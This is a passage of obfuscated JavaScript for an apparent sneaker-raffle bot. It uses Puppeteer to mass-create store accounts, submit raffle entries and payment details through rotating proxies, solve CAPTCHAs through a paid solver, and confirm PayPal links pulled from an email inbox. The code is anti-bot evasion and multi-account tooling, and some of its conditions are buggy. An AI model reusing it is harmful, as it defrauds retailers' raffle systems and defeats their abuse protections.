            console['log'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x397a11['useRandomProxy'] = ![])
            var _0x5ab7a1 = _0x447535()[_0xd41e29]['split'](':');
        else
            var _0x509a03 = Math['round'](Math['random']() * (_0x447535()['length'] - 0x1)), _0x5ab7a1 = _0x447535()[_0x509a03]['split'](':');
        const _0x3307c8 = await _0x4e5975['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x5ab7a1[0x0] + ':' + _0x5ab7a1[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x3f2dac = await _0x3307c8['newPage']();
            await _0x3f2dac['authenticate']({
                'username': '' + _0x5ab7a1[0x2],
                'password': '' + _0x5ab7a1[0x3]
            }), console['log'](_0x207f7e() + '\x20[' + _0x5d9978['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3f2dac['setRequestInterception'](!![]), _0x3f2dac['on']('request', _0x5dc8ba => {
                _0x5dc8ba['resourceType']() === 'image' || _0x5dc8ba['resourceType']() === 'font' || _0x5dc8ba['resourceType']() === 'media' ? _0x5dc8ba['abort']() : _0x5dc8ba['continue']();
            }), await _0x3f2dac['goto'](_0x3e7390), await _0x2bc7d2(0xbb8), await _0x3f2dac['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x207f7e() + '\x20[' + _0x5d9978['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20Filling\x20information'), await _0x3f2dac['type']('#RegisterForm-FirstName', '' + bouncewear[_0xd41e29]['FirstName']), await _0x2bc7d2(0x226), await _0x3f2dac['type']('#RegisterForm-LastName', '' + bouncewear[_0xd41e29]['LastName']), await _0x2bc7d2(0x226), await _0x3f2dac['type']('#RegisterForm-email', '' + bouncewear[_0xd41e29]['Email']), await _0x2bc7d2(0x226), await _0x3f2dac['type']('#RegisterForm-password', '' + bouncewear[_0xd41e29]['Password']), await _0x2bc7d2(0x226), await _0x3f2dac['click']('#marketing'), console['log'](_0x207f7e() + '\x20[' + _0x5d9978['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20Submitting..'), await _0x3f2dac['$eval']('#RegisterForm', _0x2f3d78 => _0x2f3d78['submit']()), await _0x2bc7d2(0x1f40), console['log'](_0x207f7e() + '\x20[' + _0x5d9978['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x3f2dac['solveRecaptchas'](), await _0x3f2dac['click']('.shopify-challenge__button.btn');
            async function _0x3dcfed() {
                for (var _0x264cba = 0x0; _0x264cba < 0x4; _0x264cba++) {
                    try {
                        console['log']('try'), await _0x3f2dac['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x207f7e() + '\x20[' + _0x5d9978['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20' + _0x49dcd4['red']('Catpcha\x20failed,\x20retrying..')), await _0x3f2dac['solveRecaptchas'](), await _0x3f2dac['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x3dcfed(), console['log'](_0x207f7e() + '\x20[' + _0x5d9978['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x2bc7d2(0x1f4);
            try {
                await _0x3f2dac['waitForSelector']('.featured-title'), await _0x2bc7d2(0x1f4), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x5d9978['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0xd41e29]['Email'] + '\x20Generated!')), _0xd8dc96['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0xd41e29]['Email'] + ',' + bouncewear[_0xd41e29]['Password']), console['log'](_0x49dcd4['yellow'](_0x207f7e() + '\x20[' + _0x5d9978['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0xd41e29]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x217337) {
                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x217337));
            }
        } catch (_0x4c1c29) {
            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0xd41e29 + 0x1) + '\x20:\x20' + _0x4c1c29));
        } finally {
            _0x3307c8 && _0x3307c8['close'](), console['log']('Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
        }
    }
}
async function _0x32cd67(_0x12fc31, _0x45bd86, _0x10ab90) {
    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x397a11['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4f2507 = 0x0; _0x4f2507 < _0x45bd86['length']; _0x4f2507++) {
        _0x535b9c(_0x12fc31['name'] + '\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20/\x20' + _0x45bd86['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d);
        var _0x238079 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3b1bf1
                },
                {
                    'name': 'Product',
                    'value': '' + _0x45bd86[_0x4f2507]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x45bd86[_0x4f2507]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x397a11['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x397a11['version']
                }
            ]
        }];
        const _0x31a006 = { 'embeds': _0x238079 };
        await _0x38eff1(_0x45bd86, _0x4f2507);
        if (_0x45bd86[_0x4f2507]['Email'] == '' || _0x45bd86[_0x4f2507]['Password'] == '' || _0x45bd86[_0x4f2507]['FirstName'] == '' || _0x45bd86[_0x4f2507]['LastName'] == '') {
            console['log'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x45bd86[_0x4f2507]['Password'] == '' || _0x45bd86[_0x4f2507]['Password'] == undefined) && (_0x45bd86[_0x4f2507]['Password'] = 'ErehsaWonRaj1!');
        if (_0x397a11['useRandomProxy'] = ![])
            var _0x29560c = _0x10ab90[_0x4f2507]['split'](':');
        else
            var _0x410a48 = Math['round'](Math['random']() * (_0x10ab90['length'] - 0x1)), _0x29560c = _0x10ab90[_0x410a48]['split'](':');
        const _0x454c00 = await _0x4e5975['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x29560c[0x0] + ':' + _0x29560c[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x193f54 = await _0x454c00['newPage']();
            await _0x193f54['authenticate']({
                'username': '' + _0x29560c[0x2],
                'password': '' + _0x29560c[0x3]
            }), console['log'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x193f54['setRequestInterception'](!![]), _0x193f54['on']('request', _0x428c2f => {
                _0x428c2f['resourceType']() === 'image' || _0x428c2f['resourceType']() === 'font' || _0x428c2f['resourceType']() === 'media' ? _0x428c2f['abort']() : _0x428c2f['continue']();
            }), await _0x193f54['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x193f54['goto']('' + _0x45bd86[_0x4f2507]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x193f54['waitForSelector']('#btnPdpAtb'), console['log'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x45bd86[_0x4f2507]['Size']);
            const _0x4464f3 = await _0x193f54['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x427c6b => {
                return _0x427c6b['map'](_0x37d08b => _0x37d08b['innerText']);
            }), _0xce5117 = await _0x193f54['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x20a04e = ![];
            if (_0x45bd86[_0x4f2507]['Size'] == 'RANDOM') {
                var _0x368668 = Math['round'](Math['random']() * (_0xce5117['length'] - 0x1));
                await _0xce5117[_0x368668]['click']();
            } else
                for (var _0x17e09b = 0x0; _0x17e09b < _0x4464f3['length']; _0x17e09b++) {
                    if (_0x4464f3[_0x17e09b] != _0x45bd86[_0x4f2507]['Size'])
                        continue;
                    try {
                        await _0xce5117[_0x17e09b]['click']();
                    } catch {
                        console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x20a04e = !![];
                    }
                }
            if (_0x20a04e)
                continue;
            await _0x2bc7d2(0x578), await _0x193f54['click']('#btnPdpAtb'), await _0x193f54['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x2bc7d2(0x3e8), console['log'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x193f54['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x193f54['waitForSelector']('#email'), await _0x193f54['type']('#email', _0x45bd86[_0x4f2507]['Email']), await _0x2bc7d2(0x226), await _0x193f54['click']('#guest-submit'), await _0x2bc7d2(0x1b58), console['log'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x193f54['waitForSelector']('#firstname'), await _0x193f54['type']('#firstname', _0x45bd86[_0x4f2507]['FirstName'], 0x1f4), await _0x2bc7d2(0x190), await _0x193f54['waitForSelector']('#surname'), await _0x193f54['type']('#surname', _0x45bd86[_0x4f2507]['LastName'], 0x1f4), await _0x2bc7d2(0x190), await _0x193f54['waitForSelector']('#mobile'), await _0x193f54['type']('#mobile', _0x45bd86[_0x4f2507]['Phone'], 0x1f4), await _0x2bc7d2(0x190), await _0x193f54['click']('#enterManualDiv'), await _0x2bc7d2(0x5dc), await _0x193f54['waitForSelector']('#address1'), await _0x193f54['type']('#address1', _0x45bd86[_0x4f2507]['Address1'] + '\x20' + _0x45bd86[_0x4f2507]['HouseNumber'], 0x226), await _0x2bc7d2(0x384), await _0x193f54['waitForSelector']('#address2'), await _0x193f54['type']('#address2', '' + _0x45bd86[_0x4f2507]['Address2'], 0x226), await _0x2bc7d2(0x320);
            const _0x596ca7 = await _0x193f54['$$eval']('#countryselect_view3\x20>\x20option', _0x1d8857 => {
                return _0x1d8857['map'](_0x141482 => _0x141482['value']);
            });
            var _0x126927;
            for (var _0x50355d = 0x0; _0x50355d < _0x596ca7['length']; _0x50355d++) {
                if (_0x596ca7[_0x50355d]['startsWith']('' + _0x45bd86[_0x4f2507]['Country'])) {
                    _0x126927 = _0x596ca7[_0x50355d];
                    break;
                }
                continue;
            }
            await _0x193f54['select']('#countryselect_view3', '' + _0x126927), await _0x193f54['waitForSelector']('#address4'), await _0x193f54['type']('#address4', '' + _0x45bd86[_0x4f2507]['City'], 0x1f4), await _0x2bc7d2(0x384), await _0x193f54['waitForSelector']('#postcode'), await _0x193f54['type']('#postcode', '' + _0x45bd86[_0x4f2507]['Zip'], 0x1f4), await _0x2bc7d2(0x4b0);
            const _0x3d113b = await _0x193f54['url']();
            console['log'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x55a44c = _0x3d113b['split']('?')[0x1], _0x445f77 = await _0x193f54['$']('#co_address_submit');
            await _0x445f77['evaluate'](_0x3a75bf => _0x3a75bf['click']()), await _0x2bc7d2(0x1388), await _0x193f54['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x55a44c), console['log'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x193f54['waitForSelector']('#paymentbuttons'), await _0x2bc7d2(0x1388), await _0x193f54['click']('#paymentbuttons\x20>\x20div'), await _0x2bc7d2(0x1c2), await _0x193f54['waitForSelector']('#card-number'), await _0x193f54['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x320e9f = await _0x193f54['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x2c691d = await _0x320e9f['contentFrame']();
            await _0x2c691d['waitForSelector']('.InputContainer'), await _0x2c691d['click']('.InputContainer\x20>\x20input'), await _0x2bc7d2(0x578), await _0x193f54['type']('#card-number', '' + _0x45bd86[_0x4f2507]['CreditNumber']), await _0x2bc7d2(0xfa), await _0x193f54['type']('#card-expiry', '' + _0x45bd86[_0x4f2507]['ExpiryDate']), await _0x2bc7d2(0xfa), await _0x193f54['type']('#card-cvc', '' + _0x45bd86[_0x4f2507]['CVV']), await _0x2bc7d2(0x7d0), await _0x193f54['click']('#card-button'), console['log'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x193f54['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x5e696c(_0x171351, _0x31a006);
            } catch {
                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x203DS\x20Failed')), _0x238079[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x238079[0x0]['description'] = '3DS\x20Failed', await _0x5e696c(_0x8997ff, _0x31a006);
            }
        } catch (_0x44a753) {
            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x12fc31['name'] + ']\x20Task\x20' + (_0x4f2507 + 0x1) + '\x20:\x20' + _0x44a753)), _0x238079[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x238079[0x0]['description'] = '' + _0x44a753, await _0x5e696c(_0x8997ff, _0x31a006);
        } finally {
            _0x454c00 && _0x454c00['close']();
            if (_0x4f2507 + 0x1 == _0x45bd86['length']) {
                console['log'](_0x49dcd4['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x2bc7d2(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x397a11['AfewDelay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['AfewDelay']);
        }
    }
}
async function _0x13d359(_0x7bd4e9, _0x122b22, _0x10d44b, _0xb0c1f9, _0x2de9a7) {
    var _0xe8adde, _0x55f47a = {}, _0x35c91b = [], _0x2e1efc = {}, _0x114a92 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0xb0c1f9 && (_0xb0c1f9 = {});
    if (_0x122b22 != 'ver') {
        _0x535b9c(_0x10d44b['name'] + '\x20Task\x20' + (_0x7bd4e9 + 0x1) + '\x20/\x20' + _0xb0c1f9['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d), await _0x38eff1(_0xb0c1f9, _0x7bd4e9), _0x35c91b = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3b1bf1
                },
                {
                    'name': 'Size',
                    'value': '' + _0xb0c1f9[_0x7bd4e9]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x397a11['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x14595d
                }
            ]
        }], _0x2e1efc = { 'embeds': _0x35c91b }, _0x55f47a = _0x10d44b['data'];
        _0x122b22 == 'exp' ? _0x55f47a['data']['attributes']['email'] = '' + _0xb0c1f9[_0x7bd4e9]['FirstName'] + _0xb0c1f9[_0x7bd4e9]['LastName'] + _0x397a11['catchall'] : _0x55f47a['data']['attributes']['email'] = '' + _0xb0c1f9[_0x7bd4e9]['Email'];
        if (_0xb0c1f9[_0x7bd4e9]['Size'] == 'RANDOM') {
        }
        _0x55f47a['data']['attributes']['properties']['$first_name'] = '' + _0xb0c1f9[_0x7bd4e9]['FirstName'], _0x55f47a['data']['attributes']['properties']['$last_name'] = '' + _0xb0c1f9[_0x7bd4e9]['LastName'], _0x55f47a['data']['attributes']['properties']['$address1'] = _0xb0c1f9[_0x7bd4e9]['Address1'] + '\x20' + _0xb0c1f9[_0x7bd4e9]['Address2'] + '\x20' + _0xb0c1f9[_0x7bd4e9]['HouseNumber'], _0x55f47a['data']['attributes']['properties']['$zip'] = '' + _0xb0c1f9[_0x7bd4e9]['Zip'], _0x55f47a['data']['attributes']['properties']['$city'] = '' + _0xb0c1f9[_0x7bd4e9]['City'], _0x55f47a['data']['attributes']['properties']['$country'] = '' + _0xb0c1f9[_0x7bd4e9]['Country'], _0x55f47a['data']['attributes']['properties']['Size'] = '' + _0xb0c1f9[_0x7bd4e9]['Size'], _0x55f47a['data']['attributes']['properties']['$phone_number'] = '' + _0xb0c1f9[_0x7bd4e9]['Phone'], _0x55f47a['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0xb0c1f9[_0x7bd4e9]['Follower'];
    }
    if (_0x397a11['useRandomProxy'] = ![])
        var _0x5f0a78 = _0x2de9a7[_0x7bd4e9]['split'](':');
    else
        var _0x19f4b1 = Math['round'](Math['random']() * (_0x2de9a7['length'] - 0x1)), _0x5f0a78 = _0x2de9a7[_0x19f4b1]['split'](':');
    var _0x2ce067 = {
        'jar': _0x45e81e,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x10d44b['url'],
        'headers': _0x10d44b['headers'],
        'body': JSON['stringify'](_0x55f47a),
        'proxy': 'http://' + _0x5f0a78[0x2] + ':' + _0x5f0a78[0x3] + '@' + _0x5f0a78[0x0] + ':' + _0x5f0a78[0x1]
    };
    return _0x122b22 != 'ver' && (_0x2ce067['url'] = _0x10d44b['url'], _0x2ce067['headers'] = _0x10d44b['headers']), _0x122b22 == 'ver' && (_0x2ce067['method'] = 'GET'), new Promise(function (_0x485d5a, _0x5401ac) {
        callback = async (_0x31a2e3, _0x49655f, _0x1efef7) => {
            if (!_0x31a2e3 && _0x49655f['statusCode'] == 0xca || !_0x31a2e3 && _0x49655f['statusCode'] == 0xc8) {
                if (_0x122b22 != 'ver') {
                    var _0x1e7278 = await _0x1487ea(_0xb0c1f9[_0x7bd4e9], _0x10d44b, 'dev', ![]), _0x6abd1d = await _0x1487ea(_0xb0c1f9[_0x7bd4e9], _0x10d44b, 'pub', ![]);
                    const _0x387e70 = {
                        'succesDEVMSG': { 'embeds': [_0x1e7278] },
                        'succesPUBMSG': { 'embeds': [_0x6abd1d] }
                    };
                    if (_0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '')
                        try {
                            await _0x5e696c(_0x397a11['webhook'], _0x387e70['succesDEVMSG']);
                        } catch {
                        }
                    await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x387e70['succesDEVMSG']), await _0x2bc7d2(0xc8);
                    try {
                        await _0x5e696c(_0x3ebea8, _0x387e70['succesPUBMSG']);
                    } catch {
                    }
                    _0x1560d5(_0xb0c1f9[_0x7bd4e9], _0x10d44b);
                }
                _0x485d5a(console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x10d44b['name'] + ']\x20Task\x20' + (_0x7bd4e9 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x122b22 != 'ver') {
                    var _0x28c18c = '' + _0x31a2e3, _0x429312 = await _0x1487ea(_0xb0c1f9[_0x7bd4e9], _0x10d44b, 'dev', !![], _0x28c18c), _0xe9e5bc = {};
                    _0xe9e5bc['errorDEV'] = { 'embeds': [_0x429312] }, _0x4b302f(_0xb0c1f9[_0x7bd4e9], _0x10d44b), _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0xe9e5bc['errorDEV']), await _0x5e696c(_0x8997ff, _0xe9e5bc['errorDEV']);
                }
                _0x5401ac(console['log'](_0x207f7e() + '\x20[' + _0x10d44b['name'] + ']\x20Task\x20' + (_0x7bd4e9 + 0x1) + ':\x20' + _0x31a2e3));
            }
        };
        try {
            _0x122b22 != 'ver' && console['log'](_0x207f7e() + '\x20[' + _0x10d44b['name'] + ']\x20Task\x20' + (_0x7bd4e9 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x55f47a['data']['attributes']['email']), _0x5f4dd5(_0x2ce067, callback);
        } catch (_0x24adfb) {
            console['log'](_0x207f7e() + '\x20Task\x20' + (_0x7bd4e9 + 0x1) + ':\x20' + _0x24adfb);
        }
    });
}
;
async function _0x368c6c(_0x5b996e, _0x393af1) {
    if (_0x5b4306 != 'yes')
        var _0x5b4306 = '', _0x27a3fc = 0x0;
    var _0xed948e = [];
    async function _0x2164fe() {
        console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify?');
        var _0xd9d356 = await _0x323b70['get']('Quantity')['Quantity'], _0x1ed74d = new _0x91ddb5({
            'user': _0x397a11['masterMail'],
            'password': _0x397a11['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x491772(_0x19da24) {
            _0x1ed74d['openBox']('INBOX', ![], _0x19da24);
        }
        _0x1ed74d['once']('ready', function () {
            _0x491772(function (_0x385c15, _0x1aa85b) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x385c15)
                    throw _0x385c15;
                _0x1ed74d['seq']['search']([
                    'UNSEEN',
                    [
                        'FROM',
                        'noreply@afew-store.com'
                    ]
                ], function (_0xd398b2, _0x53ec4e) {
                    if (!_0x53ec4e || !_0x53ec4e['length'])
                        console['log'](_0x207f7e() + '\x20[' + _0x5b996e['name'] + ']\x20No\x20mails\x20found'), _0x1ed74d['end']();
                    else {
                        var _0x2042bd = _0x1ed74d['seq']['fetch'](_0x53ec4e, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x2042bd['on']('message', function (_0x156c56, _0x229bea) {
                            var _0x1c2cbe = '(#' + _0x229bea + ')\x20';
                            _0x156c56['on']('body', function (_0x549dc4, _0x219a0d) {
                                _0x3631ef(_0x549dc4, (_0x1764a1, _0x4d38c3) => {
                                    if (_0x4d38c3['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x4d38c3['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x4d38c3['text']['split']('[')[0x2];
                                        var _0x4c0eb8 = mes['split'](']')[0x0];
                                        _0xed948e['push'](_0x4c0eb8);
                                    }
                                });
                            }), _0x156c56['once']('end', function () {
                            });
                        }), _0x2042bd['once']('error', function (_0x532685) {
                            console['log']('Fetch\x20error:\x20' + _0x532685);
                        }), _0x2042bd['once']('end', function () {
                            _0x1ed74d['end']();
                        });
                    }
                });
            });
        }), _0x1ed74d['once']('error', function (_0x1a9993) {
            console['log'](_0x49dcd4['red'](_0x1a9993['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x1ed74d['once']('end', async function () {
        }), _0x1ed74d['connect']();
    }
    try {
        _0x2164fe(), await _0x2bc7d2(0xfa0), console['log']('Found\x20' + _0xed948e['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x2bc7d2(0xfa0);
    }
    var _0x2bd60a;
    _0x535b9c('' + _0x5b996e);
    var _0x48e8bd = _0x393af1[0x0]['split'](':'), _0x1dfef5;
    try {
        _0x1dfef5 = await _0x4e5975['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x48e8bd[0x0] + ':' + _0x48e8bd[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x1dfef5 = await _0x4e5975['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x48e8bd[0x0] + ':' + _0x48e8bd[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x207f7e() + '\x20[' + _0x5b996e + ']\x20Getting\x20Session');
        const _0x353ed7 = await _0x1dfef5['newPage']();
        await _0x353ed7['authenticate']({
            'username': '' + _0x48e8bd[0x2],
            'password': '' + _0x48e8bd[0x3]
        }), await _0x353ed7['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x353ed7, await _0x353ed7['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x207f7e() + '\x20[' + _0x5b996e + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x353ed7['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x207f7e() + '\x20[' + _0x5b996e + ']\x20Successfully\x20logged\x20in'), await _0x2bc7d2(0x2710);
        } catch (_0x94a4ba) {
            throw new Error('Login\x20session\x20expired\x20' + _0x94a4ba);
        }
        for (var _0x401ba8 = 0x0; _0x401ba8 < _0xed948e['length']; _0x401ba8++) {
            console['log'](_0x207f7e() + '\x20[' + _0x5b996e + ']\x20Task\x20' + (_0x401ba8 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x535b9c(_0x5b996e + '\x20Task\x20' + (_0x401ba8 + 0x1) + '\x20/\x20' + _0xed948e['length']);
            const _0x102c21 = await _0x1dfef5['newPage']();
            await _0x102c21['goto']('' + _0xed948e[_0x401ba8], { 'waitUntil': 'networkidle2' }), await _0x2bc7d2(0xbb8);
            try {
                const _0x22be5c = await _0x102c21['$']('#challenge-heading');
                _0x22be5c && (console['log'](_0x207f7e() + '\x20[' + _0x5b996e + ']\x20Task\x20' + (_0x401ba8 + 0x1) + '\x20:\x20' + _0x49dcd4['yellow']('2FA\x20Required')), await _0x102c21['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x2bc7d2(0x9c40), await _0x102c21['waitForSelector']('#payment-submit-btn'), await _0x102c21['$eval']('#payment-submit-btn', _0x47151a => _0x47151a['click']()), await _0x102c21['click']('#payment-submit-btn');
                try {
                    await _0x102c21['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x2bc7d2(0x5dc), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x5b996e + ']\x20Task\x20' + (_0x401ba8 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x5e186a) {
                    _0x5b4306 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x5e186a['message']);
                } finally {
                    if (_0x5b4306 == 'yes' && _0x27a3fc != 0x2) {
                        console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x5b996e['name'] + ']\x20Task\x20' + (_0x401ba8 + 0x1) + '\x20:\x20Retrying')), _0x401ba8 = _0x401ba8 - 0x1, _0x27a3fc = _0x27a3fc + 0x1;
                        continue;
                    }
                    _0x5b4306 == 'yes' && _0x27a3fc >= 0x2 && (_0x4b302f(csv[_0x401ba8], _0x5b996e), _0x5b4306 = 'no', _0x27a3fc = 0x0), await _0x102c21['close'](), await _0x2bc7d2(0x4650);
                }
            } catch (_0x26a046) {
                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x5b996e + ']\x20Task\x20' + (_0x401ba8 + 0x1) + '\x20:\x20' + _0x26a046));
            }
        }
    } catch (_0x5922d9) {
        console['log'](_0x49dcd4['red']('' + _0x5922d9));
    } finally {
        return await _0x1dfef5['close'](), menu();
    }
}
const _0x3b60fe = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x18c8db, _0x401115, _0x48629d) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xc4679d = 0x0; _0xc4679d < _0x401115['length']; _0xc4679d++) {
                        if (_0x7be51c != 'yes')
                            var _0x7be51c = '', _0x5c0aca = 0x0;
                        var _0x377758;
